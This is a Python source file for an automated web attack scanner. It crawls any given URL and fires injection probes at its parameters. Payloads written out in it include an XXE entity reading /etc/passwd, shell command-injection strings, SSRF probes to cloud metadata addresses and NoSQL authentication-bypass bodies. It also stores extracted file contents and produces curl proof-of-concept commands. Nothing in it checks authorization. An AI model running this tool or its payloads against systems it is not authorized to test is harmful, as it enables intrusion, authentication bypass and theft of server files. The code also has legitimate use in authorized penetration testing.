"""
Unified Scanner - All-in-One Security Assessment

Combines all scanning and exploitation capabilities:
- Reconnaissance (crawling, tech detection)
- Vulnerability scanning (SQLi, XSS, LFI, RCE, SSRF)
- Advanced exploits (SSTI, XXE, NoSQL, JWT, GraphQL, Deserialization)
- Data extraction and exfiltration
- Proof of concept generation
"""

import asyncio
import aiohttp
import json
import logging
import hashlib
import urllib.parse
from datetime import datetime
from typing import Dict, Any, List, Optional, Callable
from dataclasses import dataclass, field, asdict
from enum import Enum
import re

logger = logging.getLogger(__name__)


class ScanPhase(Enum):
    INIT = "init"
    RECON = "reconnaissance"
    CRAWLING = "crawling"
    TECH_DETECT = "technology_detection"
    VULN_SCAN = "vulnerability_scanning"
    EXPLOIT = "exploitation"
    EXTRACT = "data_extraction"
    REPORT = "report_generation"
    COMPLETE = "complete"
    FAILED = "failed"


class Severity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class Finding:
    """Single vulnerability finding"""
    id: str
    vuln_type: str
    severity: Severity
    url: str
    parameter: Optional[str]
    payload: str
    evidence: str
    description: str
    poc: str
    extracted_data: Optional[Dict] = None
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict:
        return {
            **asdict(self),
            "severity": self.severity.value
        }


@dataclass
class ScanSession:
    """Full scan session tracking"""
    scan_id: str
    target_url: str
    start_time: str
    phase: ScanPhase
    progress: int = 0
    findings: List[Finding] = field(default_factory=list)
    endpoints_discovered: List[str] = field(default_factory=list)
    technologies: List[str] = field(default_factory=list)
    events: List[Dict] = field(default_factory=list)
    total_requests: int = 0
    errors: List[str] = field(default_factory=list)
    end_time: Optional[str] = None

    def to_dict(self) -> Dict:
        return {
            "scan_id": self.scan_id,
            "target_url": self.target_url,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "phase": self.phase.value,
            "progress": self.progress,
            "findings": [f.to_dict() for f in self.findings],
            "findings_count": len(self.findings),
            "severity_counts": self._count_severities(),
            "endpoints_discovered": len(self.endpoints_discovered),
            "technologies": self.technologies,
            "total_requests": self.total_requests,
            "errors": self.errors
        }

    def _count_severities(self) -> Dict[str, int]:
        counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for f in self.findings:
            counts[f.severity.value] += 1
        return counts


class UnifiedScanner:
    """All-in-one security scanner"""

    def __init__(self):
        self.sessions: Dict[str, ScanSession] = {}
        self.session: Optional[aiohttp.ClientSession] = None
        self.event_callback: Optional[Callable] = None
        self.stop_requested: Dict[str, bool] = {}

        # Import payloads
        from app.payloads import (
            SQLI_PAYLOADS, SQLI_WAF_BYPASS,
            XSS_PAYLOADS, XSS_WAF_BYPASS,
            SSTI_PAYLOADS, SSTI_BY_ENGINE,
            XXE_PAYLOADS,
            NOSQL_PAYLOADS,
            LFI_PAYLOADS, LFI_WRAPPERS,
            RCE_PAYLOADS,
            SSRF_PAYLOADS, SSRF_BYPASS,
            GRAPHQL_PAYLOADS,
        )

        self.payloads = {
            "sqli": SQLI_PAYLOADS,
            "sqli_bypass": SQLI_WAF_BYPASS,
            "xss": XSS_PAYLOADS,
            "xss_bypass": XSS_WAF_BYPASS,
            "ssti": SSTI_PAYLOADS,
            "ssti_engines": SSTI_BY_ENGINE,
            "xxe": XXE_PAYLOADS,
            "nosql": NOSQL_PAYLOADS,
            "lfi": LFI_PAYLOADS,
            "lfi_wrappers": LFI_WRAPPERS,
            "rce": RCE_PAYLOADS,
            "ssrf": SSRF_PAYLOADS,
            "ssrf_bypass": SSRF_BYPASS,
            "graphql": GRAPHQL_PAYLOADS,
        }

    async def initialize(self):
        if not self.session:
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=30),
                connector=aiohttp.TCPConnector(ssl=False, limit=20)
            )

    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None

    def _generate_id(self) -> str:
        return hashlib.md5(f"{datetime.now().isoformat()}".encode()).hexdigest()[:12]

    def _log_event(self, session: ScanSession, phase: str, message: str):
        event = {
            "id": len(session.events) + 1,
            "timestamp": datetime.now().isoformat(),
            "phase": phase,
            "message": message
        }
        session.events.append(event)
        if len(session.events) > 100:
            session.events = session.events[-100:]
        logger.info(f"[{session.scan_id}] [{phase}] {message}")

    async def _request(
        self,
        session: ScanSession,
        method: str,
        url: str,
        headers: Dict = None,
        data: Any = None,
        params: Dict = None
    ) -> tuple:
        """Make HTTP request"""
        session.total_requests += 1
        default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
        if headers:
            default_headers.update(headers)

        try:
            async with self.session.request(
                method, url, headers=default_headers, data=data, params=params
            ) as resp:
                text = await resp.text()
                return text, resp.status, dict(resp.headers)
        except Exception as e:
            return None, 0, {}

    # ==================== RECONNAISSANCE ====================

    async def _crawl(self, session: ScanSession, base_url: str, max_pages: int = 50):
        """Crawl target to discover endpoints"""
        self._log_event(session, "crawl", f"Starting crawl of {base_url}")
        visited = set()
        to_visit = [base_url]
        endpoints = []

        parsed_base = urllib.parse.urlparse(base_url)
        base_domain = parsed_base.netloc

        while to_visit and len(visited) < max_pages:
            if self.stop_requested.get(session.scan_id):
                break

            url = to_visit.pop(0)
            if url in visited:
                continue

            visited.add(url)
            resp, status, _ = await self._request(session, "GET", url)

            if resp and status == 200:
                endpoints.append(url)
                # Extract links
                links = re.findall(r'href=["\']([^"\']+)["\']', resp)
                links += re.findall(r'action=["\']([^"\']+)["\']', resp)
                links += re.findall(r'src=["\']([^"\']+)["\']', resp)

                for link in links:
                    if link.startswith("/"):
                        link = f"{parsed_base.scheme}://{base_domain}{link}"
                    elif not link.startswith("http"):
                        continue

                    parsed_link = urllib.parse.urlparse(link)
                    if parsed_link.netloc == base_domain and link not in visited:
                        to_visit.append(link)

                # Extract forms and parameters
                forms = re.findall(r'<form[^>]*>(.*?)</form>', resp, re.DOTALL | re.IGNORECASE)
                for form in forms:
                    inputs = re.findall(r'name=["\']([^"\']+)["\']', form)
                    if inputs:
                        self._log_event(session, "crawl", f"Found form with params: {inputs}")

        session.endpoints_discovered = list(set(endpoints))
        self._log_event(session, "crawl", f"Discovered {len(endpoints)} endpoints")
        return endpoints

    async def _detect_technologies(self, session: ScanSession, url: str):
        """Detect technologies used by target"""
        self._log_event(session, "tech", "Detecting technologies")
        resp, status, headers = await self._request(session, "GET", url)
        techs = []

        if resp:
            # Server header
            if "Server" in headers:
                techs.append(headers["Server"])
            if "X-Powered-By" in headers:
                techs.append(headers["X-Powered-By"])

            # Framework detection
            patterns = {
                "WordPress": ["wp-content", "wp-includes", "wordpress"],
                "Drupal": ["drupal", "sites/default"],
                "Joomla": ["joomla", "/administrator"],
                "Laravel": ["laravel_session", "csrf-token"],
                "Django": ["csrfmiddlewaretoken", "django"],
                "Flask": ["werkzeug", "flask"],
                "Express": ["express", "x-powered-by: express"],
                "React": ["react", "_reactRoot", "data-reactroot"],
                "Vue": ["vue", "__vue__", "v-cloak"],
                "Angular": ["ng-app", "angular", "ng-"],
                "jQuery": ["jquery"],
                "Bootstrap": ["bootstrap"],
                "PHP": [".php", "PHPSESSID"],
                "ASP.NET": [".aspx", "asp.net", "__VIEWSTATE"],
                "Java": [".jsp", ".do", "jsessionid"],
                "Ruby": [".rb", "rails", "_session_id"],
                "GraphQL": ["graphql", "__schema"],
            }

            resp_lower = resp.lower()
            headers_str = str(headers).lower()

            for tech, indicators in patterns.items():
                for indicator in indicators:
                    if indicator.lower() in resp_lower or indicator.lower() in headers_str:
                        if tech not in techs:
                            techs.append(tech)
                        break

        session.technologies = techs
        self._log_event(session, "tech", f"Detected: {', '.join(techs) if techs else 'None'}")
        return techs

    # ==================== VULNERABILITY SCANNING ====================

    async def _test_sqli(self, session: ScanSession, url: str, param: str):
        """Test for SQL injection"""
        payloads = self.payloads["sqli"]["detection"][:15]

        for payload in payloads:
            if self.stop_requested.get(session.scan_id):
                return

            test_url = self._inject_param(url, param, payload)
            resp, status, _ = await self._request(session, "GET", test_url)

            if resp:
                errors = [
                    "sql syntax", "mysql", "sqlite", "postgresql", "oracle",
                    "syntax error", "unclosed quotation", "unterminated string",
                    "you have an error in your sql", "warning: mysql"
                ]
                resp_lower = resp.lower()

                for error in errors:
                    if error in resp_lower:
                        finding = Finding(
                            id=self._generate_id(),
                            vuln_type="SQL Injection",
                            severity=Severity.CRITICAL,
                            url=url,
                            parameter=param,
                            payload=payload,
                            evidence=f"SQL error detected: {error}",
                            description="SQL injection vulnerability allows attackers to manipulate database queries",
                            poc=self._gen_sqli_poc(url, param, payload)
                        )
                        session.findings.append(finding)
                        self._log_event(session, "sqli", f"FOUND: {url} param={param}")
                        return

    async def _test_xss(self, session: ScanSession, url: str, param: str):
        """Test for XSS"""
        payloads = self.payloads["xss"]["basic"][:10]
        marker = f"xss{self._generate_id()[:6]}"

        for payload in payloads:
            if self.stop_requested.get(session.scan_id):
                return

            test_payload = payload.replace("alert(1)", f"alert('{marker}')")
            test_url = self._inject_param(url, param, test_payload)
            resp, status, _ = await self._request(session, "GET", test_url)

            if resp and (test_payload in resp or marker in resp):
                finding = Finding(
                    id=self._generate_id(),
                    vuln_type="Cross-Site Scripting (XSS)",
                    severity=Severity.HIGH,
                    url=url,
                    parameter=param,
                    payload=test_payload,
                    evidence="Payload reflected in response without encoding",
                    description="XSS allows attackers to inject malicious scripts",
                    poc=self._gen_xss_poc(url, param, test_payload)
                )
                session.findings.append(finding)
                self._log_event(session, "xss", f"FOUND: {url} param={param}")
                return

    async def _test_lfi(self, session: ScanSession, url: str, param: str):
        """Test for LFI"""
        payloads = self.payloads["lfi"]["basic"][:10]

        for payload in payloads:
            if self.stop_requested.get(session.scan_id):
                return

            test_url = self._inject_param(url, param, payload)
            resp, status, _ = await self._request(session, "GET", test_url)

            if resp and ("root:" in resp or "[fonts]" in resp.lower()):
                finding = Finding(
                    id=self._generate_id(),
                    vuln_type="Local File Inclusion",
                    severity=Severity.CRITICAL,
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence="System file content detected in response",
                    description="LFI allows attackers to read local files",
                    poc=self._gen_lfi_poc(url, param, payload),
                    extracted_data={"file_content": resp[:500]}
                )
                session.findings.append(finding)
                self._log_event(session, "lfi", f"FOUND: {url} param={param}")
                return

    async def _test_ssti(self, session: ScanSession, url: str, param: str):
        """Test for SSTI"""
        payloads = self.payloads["ssti"]["detection"][:8]

        for payload in payloads:
            if self.stop_requested.get(session.scan_id):
                return

            test_url = self._inject_param(url, param, payload)
            resp, status, _ = await self._request(session, "GET", test_url)

            if resp:
                # Check for template evaluation
                if "49" in resp and "7*7" in payload:
                    finding = Finding(
                        id=self._generate_id(),
                        vuln_type="Server-Side Template Injection",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence="Template expression evaluated (7*7=49)",
                        description="SSTI can lead to remote code execution",
                        poc=self._gen_ssti_poc(url, param, payload)
                    )
                    session.findings.append(finding)
                    self._log_event(session, "ssti", f"FOUND: {url} param={param}")
                    return

    async def _test_ssrf(self, session: ScanSession, url: str, param: str):
        """Test for SSRF"""
        payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]",
            "http://0.0.0.0",
        ]

        for payload in payloads:
            if self.stop_requested.get(session.scan_id):
                return

            test_url = self._inject_param(url, param, payload)
            resp, status, _ = await self._request(session, "GET", test_url)

            if resp and any(x in resp.lower() for x in ["localhost", "127.0.0.1", "ami-", "instance"]):
                finding = Finding(
                    id=self._generate_id(),
                    vuln_type="Server-Side Request Forgery",
                    severity=Severity.HIGH,
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence="Internal resource accessed",
                    description="SSRF allows accessing internal resources",
                    poc=self._gen_ssrf_poc(url, param, payload)
                )
                session.findings.append(finding)
                self._log_event(session, "ssrf", f"FOUND: {url} param={param}")
                return

    async def _test_rce(self, session: ScanSession, url: str, param: str):
        """Test for command injection"""
        payloads = ["; sleep 5", "| sleep 5", "|| sleep 5", "& sleep 5", "&& sleep 5"]

        for payload in payloads:
            if self.stop_requested.get(session.scan_id):
                return

            test_url = self._inject_param(url, param, payload)
            start = asyncio.get_event_loop().time()
            resp, status, _ = await self._request(session, "GET", test_url)
            elapsed = asyncio.get_event_loop().time() - start

            if elapsed > 4.5:  # Time-based detection
                finding = Finding(
                    id=self._generate_id(),
                    vuln_type="Remote Code Execution",
                    severity=Severity.CRITICAL,
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence=f"Time-based detection: {elapsed:.2f}s delay",
                    description="Command injection allows executing system commands",
                    poc=self._gen_rce_poc(url, param, payload)
                )
                session.findings.append(finding)
                self._log_event(session, "rce", f"FOUND: {url} param={param}")
                return

    async def _test_xxe(self, session: ScanSession, url: str):
        """Test for XXE on XML endpoints"""
        xxe_payload = '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'''

        headers = {"Content-Type": "application/xml"}
        resp, status, _ = await self._request(session, "POST", url, headers=headers, data=xxe_payload)

        if resp and "root:" in resp:
            finding = Finding(
                id=self._generate_id(),
                vuln_type="XML External Entity Injection",
                severity=Severity.CRITICAL,
                url=url,
                parameter=None,
                payload=xxe_payload,
                evidence="File content extracted via XXE",
                description="XXE allows reading local files and SSRF",
                poc=self._gen_xxe_poc(url, xxe_payload),
                extracted_data={"file_content": resp[:500]}
            )
            session.findings.append(finding)
            self._log_event(session, "xxe", f"FOUND: {url}")

    async def _test_nosql(self, session: ScanSession, url: str, param: str):
        """Test for NoSQL injection"""
        payloads = ['{"$ne": ""}', '{"$gt": ""}', '{"$regex": ".*"}']

        for payload in payloads:
            if self.stop_requested.get(session.scan_id):
                return

            # Test as JSON body
            headers = {"Content-Type": "application/json"}
            body = f'{{"{param}": {payload}}}'
            resp, status, _ = await self._request(session, "POST", url, headers=headers, data=body)

            if resp and status == 200:
                if any(x in resp.lower() for x in ["welcome", "dashboard", "logout", "success"]):
                    finding = Finding(
                        id=self._generate_id(),
                        vuln_type="NoSQL Injection",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence="Authentication bypass detected",
                        description="NoSQL injection allows bypassing authentication",
                        poc=self._gen_nosql_poc(url, param, payload)
                    )
                    session.findings.append(finding)
                    self._log_event(session, "nosql", f"FOUND: {url} param={param}")
                    return

    async def _test_graphql(self, session: ScanSession, url: str):
        """Test GraphQL endpoint"""
        introspection = '{"query": "{ __schema { types { name } } }"}'
        headers = {"Content-Type": "application/json"}
        resp, status, _ = await self._request(session, "POST", url, headers=headers, data=introspection)

        if resp and "__schema" in resp:
            finding = Finding(
                id=self._generate_id(),
                vuln_type="GraphQL Introspection Enabled",
                severity=Severity.MEDIUM,
                url=url,
                parameter=None,
                payload=introspection,
                evidence="Full schema exposed via introspection",
                description="GraphQL introspection reveals API structure",
                poc=self._gen_graphql_poc(url, introspection)
            )
            session.findings.append(finding)
            self._log_event(session, "graphql", f"FOUND: introspection enabled at {url}")

    # ==================== MAIN SCAN ====================

    async def full_scan(
        self,
        target_url: str,
        max_pages: int = 50,
        callback: Optional[Callable] = None
    ) -> ScanSession:
        """Execute complete security scan"""
        await self.initialize()

        scan_id = self._generate_id()
        session = ScanSession(
            scan_id=scan_id,
            target_url=target_url,
            start_time=datetime.now().isoformat(),
            phase=ScanPhase.INIT
        )
        self.sessions[scan_id] = session
        self.stop_requested[scan_id] = False
        self.event_callback = callback

        try:
            # Phase 1: Reconnaissance
            session.phase = ScanPhase.RECON
            session.progress = 5
            self._log_event(session, "init", f"Starting scan on {target_url}")

            # Crawling
            session.phase = ScanPhase.CRAWLING
            session.progress = 10
            await self._crawl(session, target_url, max_pages)

            if self.stop_requested.get(scan_id):
                return session

            # Tech detection
            session.phase = ScanPhase.TECH_DETECT
            session.progress = 20
            await self._detect_technologies(session, target_url)

            if self.stop_requested.get(scan_id):
                return session

            # Phase 2: Vulnerability Scanning
            session.phase = ScanPhase.VULN_SCAN
            endpoints = session.endpoints_discovered or [target_url]
            total_tests = len(endpoints) * 7  # 7 vuln types
            completed = 0

            for endpoint in endpoints:
                if self.stop_requested.get(scan_id):
                    break

                # Extract parameters from URL
                parsed = urllib.parse.urlparse(endpoint)
                params = urllib.parse.parse_qs(parsed.query)
                param_names = list(params.keys()) if params else ["id", "page", "file", "url", "q"]

                for param in param_names:
                    if self.stop_requested.get(scan_id):
                        break

                    self._log_event(session, "scan", f"Testing {endpoint} param={param}")

                    # Run all tests
                    await self._test_sqli(session, endpoint, param)
                    await self._test_xss(session, endpoint, param)
                    await self._test_lfi(session, endpoint, param)
                    await self._test_ssti(session, endpoint, param)
                    await self._test_ssrf(session, endpoint, param)
                    await self._test_rce(session, endpoint, param)
                    await self._test_nosql(session, endpoint, param)

                completed += 7
                session.progress = 20 + int((completed / total_tests) * 60)

            # Test XXE on base URL
            await self._test_xxe(session, target_url)

            # Test GraphQL
            for gql_path in ["/graphql", "/api/graphql", "/gql"]:
                gql_url = f"{target_url.rstrip('/')}{gql_path}"
                await self._test_graphql(session, gql_url)

            # Phase 3: Complete
            session.phase = ScanPhase.COMPLETE
            session.progress = 100
            session.end_time = datetime.now().isoformat()
            self._log_event(session, "complete", f"Scan finished. Found {len(session.findings)} vulnerabilities")

        except Exception as e:
            session.phase = ScanPhase.FAILED
            session.errors.append(str(e))
            self._log_event(session, "error", str(e))
            logger.exception(f"Scan failed: {e}")

        return session

    def stop_scan(self, scan_id: str):
        """Request scan stop"""
        self.stop_requested[scan_id] = True

    def get_session(self, scan_id: str) -> Optional[ScanSession]:
        return self.sessions.get(scan_id)

    def get_session_status(self, scan_id: str) -> Optional[Dict]:
        session = self.sessions.get(scan_id)
        if not session:
            return None
        return {
            "scan_id": scan_id,
            "phase": session.phase.value,
            "progress": session.progress,
            "findings_count": len(session.findings),
            "requests": session.total_requests,
            "events": session.events[-20:]
        }

    # ==================== HELPERS ====================

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        query[param] = [payload]
        new_query = urllib.parse.urlencode(query, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _gen_sqli_poc(self, url, param, payload):
        return f"""# SQL Injection
Target: {url}
Parameter: {param}
Payload: {payload}

curl "{self._inject_param(url, param, payload)}"
"""

    def _gen_xss_poc(self, url, param, payload):
        return f"""# Cross-Site Scripting
Target: {url}
Parameter: {param}
Payload: {payload}

curl "{self._inject_param(url, param, payload)}"
"""

    def _gen_lfi_poc(self, url, param, payload):
        return f"""# Local File Inclusion
Target: {url}
Parameter: {param}
Payload: {payload}

curl "{self._inject_param(url, param, payload)}"
"""

    def _gen_ssti_poc(self, url, param, payload):
        return f"""# Server-Side Template Injection
Target: {url}
Parameter: {param}
Payload: {payload}

curl "{self._inject_param(url, param, payload)}"
"""

    def _gen_ssrf_poc(self, url, param, payload):
        return f"""# Server-Side Request Forgery
Target: {url}
Parameter: {param}
Payload: {payload}

curl "{self._inject_param(url, param, payload)}"
"""

    def _gen_rce_poc(self, url, param, payload):
        return f"""# Remote Code Execution
Target: {url}
Parameter: {param}
Payload: {payload}

curl "{self._inject_param(url, param, payload)}"
"""

    def _gen_xxe_poc(self, url, payload):
        return f"""# XML External Entity Injection
Target: {url}

curl -X POST "{url}" -H "Content-Type: application/xml" -d '{payload}'
"""

    def _gen_nosql_poc(self, url, param, payload):
        return f"""# NoSQL Injection
Target: {url}
Parameter: {param}

curl -X POST "{url}" -H "Content-Type: application/json" -d '{{"{param}": {payload}}}'
"""

    def _gen_graphql_poc(self, url, payload):
        return f"""# GraphQL Introspection
Target: {url}

curl -X POST "{url}" -H "Content-Type: application/json" -d '{payload}'
"""


# Global instance
_scanner: Optional[UnifiedScanner] = None


def get_unified_scanner() -> UnifiedScanner:
    global _scanner
    if _scanner is None:
        _scanner = UnifiedScanner()
    return _scanner
